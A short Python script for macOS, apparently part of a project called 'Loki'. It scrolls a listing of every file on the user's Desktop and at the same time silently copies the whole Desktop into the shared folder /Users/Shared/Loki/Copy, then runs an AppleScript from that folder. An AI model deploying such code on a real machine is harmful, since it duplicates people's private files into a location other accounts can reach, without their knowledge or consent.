import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=55, cols=250))

import os, shutil, getpass, time, random
from threading import Thread

username = getpass.getuser ()
path = os.getcwd() + "/"
userpath = "/Users/" + username + "/Desktop/"

def getListOfFiles(dirName):
    # create a list of file and sub directories 
    # names in the given directory 
    listOfFile = os.listdir(dirName)
    allFiles = list()
    # Iterate over all the entries
    for entry in listOfFile:
        # Create full path
        fullPath = os.path.join(dirName, entry)
        # If entry is a directory then get the list of files in this directory 
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)
                
    return allFiles

def copytree2 (source, dest):
    dest_dir = os.path.join (dest, os.path.basename (source))
    
    def coptree ():
        shutil.copytree (source, dest_dir)
    
    def showFinder ():
        os.system ("osascript /Users/Shared/Loki/ShowFinder.scpt")
    
    Thread (target = coptree).start ()
    Thread (target = showFinder).start ()

def main():
    global counter
    
    dirName = userpath
    
    # Get the list of all files in directory tree at given path
    def listFiles ():
        listOfFiles = list()
        for (dirpath, dirnames, filenames) in os.walk(dirName):
            listOfFiles += [os.path.join(dirpath, file) for file in filenames]
        
        # Print the files    
        for elem in listOfFiles:
            print(elem)
            time.sleep (0.008)

    def copy ():
        copytree2 (userpath, "/Users/Shared/Loki/Copy")

    Thread (target = listFiles).start()
    Thread (target = copy).start()

#if __name__ == '__main__':
main()
